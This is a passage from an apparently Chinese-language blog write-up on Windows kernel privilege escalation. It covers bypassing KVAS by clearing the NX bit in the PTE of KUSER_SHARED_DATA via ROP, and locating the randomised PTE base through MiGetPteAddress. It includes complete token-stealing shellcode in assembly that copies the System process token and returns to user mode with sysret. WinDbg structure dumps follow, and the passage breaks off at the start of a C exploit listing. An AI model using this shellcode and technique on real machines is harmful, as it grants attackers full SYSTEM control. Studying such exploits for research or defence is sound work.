：开启KVAS时，应用程序会有两个CR3，即有PCB.DirectoryTableBase和PCB.UserDirectoryTableBase两个域。其中DirectoryTableBase域可以理解为内核CR3，能够访问内核物理页，而ring3的Cr3（UserDirectoryTableBase）只映射了内核的KVASCODE区段的物理页（少数r3进入r0的入口），而没有映射其他区段的，因此通过ring3的Cr3寻找内核TEXT段的物理页，最多只能找到PPE，而从PDE开始就没有映射了。</li><li><strong>遇到的坑</strong> ：</li></ul><ol><li>直接跳转用户态 Shellcode -&gt; <code>Access Violation (0xC0000005)</code> (因为找不到页面)。</li></ol><ul><li><strong>最终绕过手段</strong> ： <strong>PTE 篡改 (PTE Manipulation)</strong> 。</li><li><strong>思路</strong> ：不回用户态，而是将 Shellcode 搬运到内核空间。</li><li><strong>目标</strong> ：<code>KUSER_SHARED_DATA</code> (<code>0xFFFFF78000000000</code>)。用户空间和内核空间的共享区域，地址<strong>固定</strong>，内核程序对这块共享区域有<strong>可读</strong>、<strong>可写</strong>的权限，用户程序对这块共享区域只有<strong>只读</strong>的权限。</li><li><strong>操作</strong> ：利用 ROP 修改该页面的  <strong>PTE (页表项)</strong> ，清除 <strong>NX (No-Execute)</strong> 位。</li></ul><h4 id="PTE-权限位-MMPTE-HARDWARE-以及地址计算"><a href="#PTE-权限位-MMPTE-HARDWARE-以及地址计算" class="headerlink" title="PTE 权限位 (_MMPTE_HARDWARE)以及地址计算"></a>PTE 权限位 (<code>_MMPTE_HARDWARE</code>)以及地址计算</h4><p>PTE 本质上是一个 64位 (8字节) 的数值。我们需要精准控制其中的某一位。</p><p><strong>PTE 关键位布局 (Bit Map):</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_MMPTE_HARDWARE</span><br><span class="line">   +0x000 Valid            : Pos 0, 1 Bit</span><br><span class="line">   +0x000 Dirty1           : Pos 1, 1 Bit</span><br><span class="line">   +0x000 Owner            : Pos 2, 1 Bit</span><br><span class="line">   +0x000 WriteThrough     : Pos 3, 1 Bit</span><br><span class="line">   +0x000 CacheDisable     : Pos 4, 1 Bit</span><br><span class="line">   +0x000 Accessed         : Pos 5, 1 Bit</span><br><span class="line">   +0x000 Dirty            : Pos 6, 1 Bit</span><br><span class="line">   +0x000 LargePage        : Pos 7, 1 Bit</span><br><span class="line">   +0x000 Global           : Pos 8, 1 Bit</span><br><span class="line">   +0x000 CopyOnWrite      : Pos 9, 1 Bit</span><br><span class="line">   +0x000 Unused           : Pos 10, 1 Bit</span><br><span class="line">   +0x000 Write            : Pos 11, 1 Bit</span><br><span class="line">   +0x000 PageFrameNumber  : Pos 12, 36 Bits</span><br><span class="line">   +0x000 ReservedForHardware : Pos 48, 4 Bits</span><br><span class="line">   +0x000 ReservedForSoftware : Pos 52, 4 Bits</span><br><span class="line">   +0x000 WsleAge          : Pos 56, 4 Bits</span><br><span class="line">   +0x000 WsleProtection   : Pos 60, 3 Bits</span><br><span class="line">   +0x000 NoExecute        : Pos 63, 1 Bit</span><br></pre></td></tr></table></figure><table><thead><tr><th>位 (Bit)</th><th>名称</th><th>说明</th><th>EXP 关注点</th></tr></thead><tbody><tr><td>63(最高位)</td><td>NX (No-Execute)</td><td>1&#x3D;禁止执行 , 0&#x3D;允许执行</td><td>攻击目标！我们要把它置 0</td></tr><tr><td>12-62</td><td>PFN</td><td>物理页帧号 (实际物理地址)</td><td>动了就找不到物理内存了</td></tr><tr><td>2</td><td>U&#x2F;S (User&#x2F;Supervisor)</td><td>0&#x3D;内核页, 1&#x3D;用户页</td><td>保持 0 (内核页)</td></tr><tr><td>1</td><td>R&#x2F;W (Read&#x2F;Write)</td><td>1&#x3D;可写, 0&#x3D;只读</td><td>保持 1 (我们需要写入 Shellcode)</td></tr><tr><td>0</td><td>P (Present)</td><td>1&#x3D;页面有效 , 0&#x3D;无效</td><td>置 0 会直接缺页蓝屏</td></tr></tbody></table><p><strong>PTE 地址计算公式：</strong></p><p>在 Windows x64 中，页表本身也映射在虚拟内存中。计算公式如下：</p><p>$$<br>\text{PTE_Addr} &#x3D; \text{PTE_BASE} + (\text{VirtualAddress} \gg 9) \times 8<br>$$</p><p>或者用位运算优化版（我们在 EXP 中用的）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PTE_Addr = PTE_BASE + (VirtualAddress &gt;&gt; 9) &amp; 0x7FFFFFFFF8</span><br></pre></td></tr></table></figure><p><strong>Win10 1607 (RS1) 及之后</strong> ：为了安全，微软引入了  <strong>页表基址随机化</strong> 。</p><p><strong>原理</strong> ：PML4 表（顶级页表）有 512 个条目。系统启动时，随机选择一个条目（例如第 <code>idx</code> 项）指向 PML4 自身。</p><p><strong>绕过随机化</strong>：利用 <code>MiGetPteAddress</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000140298780 MiGetPteAddress proc near               ; CODE XREF: MiPfPrepareSequentialReadList+2D0↓p</span><br><span class="line">.text:0000000140298780                                         ; MiPfPrepareSequentialReadList+2DB↓p ...</span><br><span class="line">.text:0000000140298780                 shr     rcx, 9</span><br><span class="line">.text:0000000140298784                 mov     rax, 7FFFFFFFF8h</span><br><span class="line">.text:000000014029878E                 and     rcx, rax</span><br><span class="line">.text:0000000140298791                 mov     rax, 0FFFFF68000000000h ; 这里的立即数就是动态的 PTE_BASE</span><br><span class="line">.text:000000014029879B                 add     rax, rcx</span><br><span class="line">.text:000000014029879E                 retn</span><br><span class="line">.text:000000014029879E MiGetPteAddress endp</span><br></pre></td></tr></table></figure><h3 id="4-提权手段：Token-Stealing-令牌窃取"><a href="#4-提权手段：Token-Stealing-令牌窃取" class="headerlink" title="4. 提权手段：Token Stealing (令牌窃取)"></a>4. 提权手段：Token Stealing (令牌窃取)</h3><p><strong>原理</strong> ：遍历系统进程链表，找到 System 进程 (PID 4)，将其 Token 复制给当前进程。</p><p> <strong>Shellcode 逻辑</strong> ：</p><ol><li>获取当前进程 <code>_EPROCESS</code>。</li><li>遍历 <code>ActiveProcessLinks</code> 链表。</li><li>匹配 <code>UniqueProcessId == 4</code>。</li><li>读取 System Token，写入当前进程的 Token 字段。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">start:</span><br><span class="line">xor rax, rax</span><br><span class="line">mov rax, [gs:rax + 188h]; gs[0] == KPCR, Get KPCRB.CurrentThread field</span><br><span class="line">mov rax, [rax+0xb8]; Get (KAPC_STATE)ApcState.Process (our EPROCESS)</span><br><span class="line">mov r9, rax;; Backup target EPROCESS at r9</span><br><span class="line"></span><br><span class="line">; loop processes list</span><br><span class="line">mov rax, [rax + 0x448]; +0x448 ActiveProcessLinks : _LIST_ENTRY.Flink; Read first link</span><br><span class="line">mov rax, [rax]; Follow the first link</span><br><span class="line">system_process_loop:</span><br><span class="line">mov rdx, [rax - 0x8]; ProcessId</span><br><span class="line">mov r8, rax;; backup system EPROCESS.ActiveProcessLinks pointer at r8</span><br><span class="line">mov rax, [rax]; Next process</span><br><span class="line">cmp rdx, 4; System PID</span><br><span class="line">jnz system_process_loop</span><br><span class="line"></span><br><span class="line">mov rdx, [r8 + 0x70]</span><br><span class="line">and rdx, 0xfffffffffffffff8; Ignore ref count</span><br><span class="line">mov rcx, [r9 + 0x4b8]</span><br><span class="line">and rcx, 0x7</span><br><span class="line">add rdx, rcx; put target&#x27;s ref count into our token</span><br><span class="line">mov [r9 + 0x4b8], rdx; rdx = system token; KPROCESS+0x4b8 is the Token, KPROCESS+0x448 is the process links - 0x70 is the diff</span><br><span class="line"></span><br><span class="line">;db 0xcc</span><br><span class="line">ret_to_usermode:</span><br><span class="line">;sti</span><br><span class="line">mov rax, [gs:0x188]; _KPCR.Prcb.CurrentThread</span><br><span class="line">;mov cx, [rax + 0x1e4]; KTHREAD.KernelApcDisable</span><br><span class="line">;inc cx</span><br><span class="line">;mov [rax + 0x1e4], cx</span><br><span class="line">mov rdx, [rax + 0x90] ; ETHREAD.TrapFrame</span><br><span class="line">mov rcx, [rdx + 0x168]; ETHREAD.TrapFrame.Rip</span><br><span class="line">mov r11, [rdx + 0x178]; ETHREAD.TrapFrame.EFlags</span><br><span class="line">or r11, 0x200 ; 这样 sysret 恢复状态时，中断就会被打开</span><br><span class="line">mov rsp, [rdx + 0x180]; ETHREAD.TrapFrame.Rsp</span><br><span class="line">mov rbp, [rdx + 0x158]; ETHREAD.TrapFrame.Rbp</span><br><span class="line">;db 0xcc</span><br><span class="line">xor eax, eax ; return STATUS_SUCCESS to NtDeviceIoControlFile </span><br><span class="line">swapgs</span><br><span class="line">o64 sysret; nasm shit</span><br></pre></td></tr></table></figure><h3 id="5-相关结构体"><a href="#5-相关结构体" class="headerlink" title="5.相关结构体"></a>5.相关结构体</h3><h4 id="EPROCESS-进程结构体"><a href="#EPROCESS-进程结构体" class="headerlink" title="_EPROCESS (进程结构体)"></a><strong>_EPROCESS</strong> (进程结构体)</h4><ul><li><code>dt nt!_EPROCESS</code></li><li>关键偏移：<ul><li>0x440: <code>UniqueProcessId</code> (PID)</li><li>0x448: <code>ActiveProcessLinks</code> (链表)</li><li>0x4b8: <code>Token</code> (令牌)</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   +0x460 Flags2           : Uint4B</span><br><span class="line">   +0x460 JobNotReallyActive : Pos 0, 1 Bit</span><br><span class="line">   +0x460 AccountingFolded : Pos 1, 1 Bit</span><br><span class="line">   +0x460 NewProcessReported : Pos 2, 1 Bit</span><br><span class="line">   +0x460 ExitProcessReported : Pos 3, 1 Bit</span><br><span class="line">   +0x460 ReportCommitChanges : Pos 4, 1 Bit</span><br><span class="line">   +0x460 LastReportMemory : Pos 5, 1 Bit</span><br><span class="line">   +0x460 ForceWakeCharge  : Pos 6, 1 Bit</span><br><span class="line">   +0x460 CrossSessionCreate : Pos 7, 1 Bit</span><br><span class="line">   +0x460 NeedsHandleRundown : Pos 8, 1 Bit</span><br><span class="line">   +0x460 RefTraceEnabled  : Pos 9, 1 Bit</span><br><span class="line">   +0x460 PicoCreated      : Pos 10, 1 Bit</span><br><span class="line">   +0x460 EmptyJobEvaluated : Pos 11, 1 Bit</span><br><span class="line">   +0x460 DefaultPagePriority : Pos 12, 3 Bits</span><br><span class="line">   +0x460 PrimaryTokenFrozen : Pos 15, 1 Bit</span><br><span class="line">   +0x460 ProcessVerifierTarget : Pos 16, 1 Bit</span><br><span class="line">   +0x460 RestrictSetThreadContext : Pos 17, 1 Bit</span><br><span class="line">   +0x460 AffinityPermanent : Pos 18, 1 Bit</span><br><span class="line">   +0x460 AffinityUpdateEnable : Pos 19, 1 Bit</span><br><span class="line">   +0x460 PropagateNode    : Pos 20, 1 Bit</span><br><span class="line">   +0x460 ExplicitAffinity : Pos 21, 1 Bit</span><br><span class="line">   +0x460 ProcessExecutionState : Pos 22, 2 Bits</span><br><span class="line">   +0x460 EnableReadVmLogging : Pos 24, 1 Bit</span><br><span class="line">   +0x460 EnableWriteVmLogging : Pos 25, 1 Bit</span><br><span class="line">   +0x460 FatalAccessTerminationRequested : Pos 26, 1 Bit</span><br><span class="line">   +0x460 DisableSystemAllowedCpuSet : Pos 27, 1 Bit</span><br><span class="line">   +0x460 ProcessStateChangeRequest : Pos 28, 2 Bits</span><br><span class="line">   +0x460 ProcessStateChangeInProgress : Pos 30, 1 Bit</span><br><span class="line">   +0x460 InPrivate        : Pos 31, 1 Bit</span><br><span class="line">   +0x464 Flags            : Uint4B</span><br><span class="line">   +0x464 CreateReported   : Pos 0, 1 Bit</span><br><span class="line">   +0x464 NoDebugInherit   : Pos 1, 1 Bit</span><br><span class="line">   +0x464 ProcessExiting   : Pos 2, 1 Bit</span><br><span class="line">   +0x464 ProcessDelete    : Pos 3, 1 Bit</span><br><span class="line">   +0x464 ManageExecutableMemoryWrites : Pos 4, 1 Bit</span><br><span class="line">   +0x464 VmDeleted        : Pos 5, 1 Bit</span><br><span class="line">   +0x464 OutswapEnabled   : Pos 6, 1 Bit</span><br><span class="line">   +0x464 Outswapped       : Pos 7, 1 Bit</span><br><span class="line">   +0x464 FailFastOnCommitFail : Pos 8, 1 Bit</span><br><span class="line">   +0x464 Wow64VaSpace4Gb  : Pos 9, 1 Bit</span><br><span class="line">   +0x464 AddressSpaceInitialized : Pos 10, 2 Bits</span><br><span class="line">   +0x464 SetTimerResolution : Pos 12, 1 Bit</span><br><span class="line">   +0x464 BreakOnTermination : Pos 13, 1 Bit</span><br><span class="line">   +0x464 DeprioritizeViews : Pos 14, 1 Bit</span><br><span class="line">   +0x464 WriteWatch       : Pos 15, 1 Bit</span><br><span class="line">   +0x464 ProcessInSession : Pos 16, 1 Bit</span><br><span class="line">   +0x464 OverrideAddressSpace : Pos 17, 1 Bit</span><br><span class="line">   +0x464 HasAddressSpace  : Pos 18, 1 Bit</span><br><span class="line">   +0x464 LaunchPrefetched : Pos 19, 1 Bit</span><br><span class="line">   +0x464 Background       : Pos 20, 1 Bit</span><br><span class="line">   +0x464 VmTopDown        : Pos 21, 1 Bit</span><br><span class="line">   +0x464 ImageNotifyDone  : Pos 22, 1 Bit</span><br><span class="line">   +0x464 PdeUpdateNeeded  : Pos 23, 1 Bit</span><br><span class="line">   +0x464 VdmAllowed       : Pos 24, 1 Bit</span><br><span class="line">   +0x464 ProcessRundown   : Pos 25, 1 Bit</span><br><span class="line">   +0x464 ProcessInserted  : Pos 26, 1 Bit</span><br><span class="line">   +0x464 DefaultIoPriority : Pos 27, 3 Bits</span><br><span class="line">   +0x464 ProcessSelfDelete : Pos 30, 1 Bit</span><br><span class="line">   +0x464 SetTimerResolutionLink : Pos 31, 1 Bit</span><br><span class="line">   +0x468 CreateTime       : _LARGE_INTEGER</span><br><span class="line">   +0x470 ProcessQuotaUsage : [2] Uint8B</span><br><span class="line">   +0x480 ProcessQuotaPeak : [2] Uint8B</span><br><span class="line">   +0x490 PeakVirtualSize  : Uint8B</span><br><span class="line">   +0x498 VirtualSize      : Uint8B</span><br><span class="line">   +0x4a0 SessionProcessLinks : _LIST_ENTRY</span><br><span class="line">   +0x4b0 ExceptionPortData : Ptr64 Void</span><br><span class="line">   +0x4b0 ExceptionPortValue : Uint8B</span><br><span class="line">   +0x4b0 ExceptionPortState : Pos 0, 3 Bits</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><h4 id="KTHREAD-线程结构体"><a href="#KTHREAD-线程结构体" class="headerlink" title="_KTHREAD (线程结构体)"></a><strong>_KTHREAD</strong> (线程结构体)</h4><ul><li><code>dt nt!_KTHREAD</code></li><li>关键偏移：<ul><li><code>ApcState.Process</code> (指向 EPROCESS)</li><li><code>TrapFrame</code> (指向中断帧)</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+0x090 TrapFrame        : Ptr64 _KTRAP_FRAME</span><br><span class="line">+0x098 ApcState         : _KAPC_STATE</span><br></pre></td></tr></table></figure><h4 id="KTRAP-FRAME-中断帧"><a href="#KTRAP-FRAME-中断帧" class="headerlink" title="_KTRAP_FRAME (中断帧)"></a><strong>_KTRAP_FRAME</strong> (中断帧)</h4><ul><li><code>dt nt!_KTRAP_FRAME</code></li><li>关键偏移：<code>Rip</code>, <code>Rsp</code>, <code>EFlags</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dt nt!_KTRAP_FRAME</span><br><span class="line">   +0x000 P1Home           : Uint8B</span><br><span class="line">   +0x008 P2Home           : Uint8B</span><br><span class="line">   +0x010 P3Home           : Uint8B</span><br><span class="line">   +0x018 P4Home           : Uint8B</span><br><span class="line">   +0x020 P5               : Uint8B</span><br><span class="line">   +0x028 PreviousMode     : Char</span><br><span class="line">   +0x028 InterruptRetpolineState : UChar</span><br><span class="line">   +0x029 PreviousIrql     : UChar</span><br><span class="line">   +0x02a FaultIndicator   : UChar</span><br><span class="line">   +0x02a NmiMsrIbrs       : UChar</span><br><span class="line">   +0x02b ExceptionActive  : UChar</span><br><span class="line">   +0x02c MxCsr            : Uint4B</span><br><span class="line">   +0x030 Rax              : Uint8B</span><br><span class="line">   +0x038 Rcx              : Uint8B</span><br><span class="line">   +0x040 Rdx              : Uint8B</span><br><span class="line">   +0x048 R8               : Uint8B</span><br><span class="line">   +0x050 R9               : Uint8B</span><br><span class="line">   +0x058 R10              : Uint8B</span><br><span class="line">   +0x060 R11              : Uint8B</span><br><span class="line">   +0x068 GsBase           : Uint8B</span><br><span class="line">   +0x068 GsSwap           : Uint8B</span><br><span class="line">   +0x070 Xmm0             : _M128A</span><br><span class="line">   +0x080 Xmm1             : _M128A</span><br><span class="line">   +0x090 Xmm2             : _M128A</span><br><span class="line">   +0x0a0 Xmm3             : _M128A</span><br><span class="line">   +0x0b0 Xmm4             : _M128A</span><br><span class="line">   +0x0c0 Xmm5             : _M128A</span><br><span class="line">   +0x0d0 FaultAddress     : Uint8B</span><br><span class="line">   +0x0d0 ContextRecord    : Uint8B</span><br><span class="line">   +0x0d8 Dr0              : Uint8B</span><br><span class="line">   +0x0e0 Dr1              : Uint8B</span><br><span class="line">   +0x0e8 Dr2              : Uint8B</span><br><span class="line">   +0x0f0 Dr3              : Uint8B</span><br><span class="line">   +0x0f8 Dr6              : Uint8B</span><br><span class="line">   +0x100 Dr7              : Uint8B</span><br><span class="line">   +0x108 DebugControl     : Uint8B</span><br><span class="line">   +0x110 LastBranchToRip  : Uint8B</span><br><span class="line">   +0x118 LastBranchFromRip : Uint8B</span><br><span class="line">   +0x120 LastExceptionToRip : Uint8B</span><br><span class="line">   +0x128 LastExceptionFromRip : Uint8B</span><br><span class="line">   +0x130 SegDs            : Uint2B</span><br><span class="line">   +0x132 SegEs            : Uint2B</span><br><span class="line">   +0x134 SegFs            : Uint2B</span><br><span class="line">   +0x136 SegGs            : Uint2B</span><br><span class="line">   +0x138 TrapFrame        : Uint8B</span><br><span class="line">   +0x140 NmiPreviousSpecCtrl : Uint4B</span><br><span class="line">   +0x144 NmiPreviousSpecCtrlPad : Uint4B</span><br><span class="line">   +0x140 Rbx              : Uint8B</span><br><span class="line">   +0x148 Rdi              : Uint8B</span><br><span class="line">   +0x150 Rsi              : Uint8B</span><br><span class="line">   +0x158 Rbp              : Uint8B</span><br><span class="line">   +0x160 ErrorCode        : Uint8B</span><br><span class="line">   +0x160 ExceptionFrame   : Uint8B</span><br><span class="line">   +0x168 Rip              : Uint8B</span><br><span class="line">   +0x170 SegCs            : Uint2B</span><br><span class="line">   +0x172 Fill0            : UChar</span><br><span class="line">   +0x173 Logging          : UChar</span><br><span class="line">   +0x174 Fill1            : [2] Uint2B</span><br><span class="line">   +0x178 EFlags           : Uint4B</span><br><span class="line">   +0x17c Fill2            : Uint4B</span><br><span class="line">   +0x180 Rsp              : Uint8B</span><br><span class="line">   +0x188 SegSs            : Uint2B</span><br><span class="line">   +0x18a Fill3            : Uint2B</span><br><span class="line">   +0x18c Fill4            : Uint4B</span><br></pre></td></tr></table></figure><h3 id="6-调试命令-WinDbg"><a href="#6-调试命令-WinDbg" class="headerlink" title="6. 调试命令(WinDbg)"></a>6. 调试命令(WinDbg)</h3><table><thead><tr><th><strong>场景</strong></th><th><strong>命令</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td><strong>环境配置</strong></td><td><code>bcdedit /dbgsettings</code></td><td>查看&#x2F;设置调试 IP 和端口</td></tr><tr><td><strong>崩溃分析</strong></td><td><code>!analyze -v</code></td><td>蓝屏后查看原因 (BugCheck Code)</td></tr><tr><td><strong>寄存器</strong></td><td><code>r cr4</code></td><td>查看 SMEP&#x2F;SMAP 状态 (Bit 20&#x2F;21)</td></tr><tr><td><strong>寄存器</strong></td><td><code>rdmsr 0xC0000102</code></td><td>查看 Kernel GS Base</td></tr><tr><td><strong>内存查看</strong></td><td><code>dq &lt;addr&gt; L10</code></td><td>以 64 位格式查看内存</td></tr><tr><td><strong>反汇编</strong></td><td><code>u &lt;addr&gt; L10</code></td><td>查看地址处的汇编代码</td></tr><tr><td><strong>结构体</strong></td><td><code>dt nt!_EPROCESS &lt;addr&gt;</code></td><td>解析进程结构体</td></tr><tr><td><strong>Token</strong></td><td><code>!token &lt;addr&gt;</code></td><td>解析 Token 权限 (看是否为 System)</td></tr><tr><td><strong>页表</strong></td><td><code>!pte &lt;addr&gt;</code></td><td>查看虚拟地址的页表属性 (NX&#x2F;RW)</td></tr><tr><td><strong>断点</strong></td><td><code>bp &lt;addr&gt;</code></td><td>下断点</td></tr><tr><td><strong>断点</strong></td><td><code>bl</code>&#x2F;<code>bc *</code></td><td>列出断点 &#x2F; 清除所有断点</td></tr><tr><td><strong>符号搜索</strong></td><td><code>x nt!Ki*Shadow</code></td><td>搜索内核符号 (如 KPTI 相关)</td></tr></tbody></table><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kwin.h&quot;</span></span></span><br><span class="line"><span class="comment">// 驱动设备名称</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span 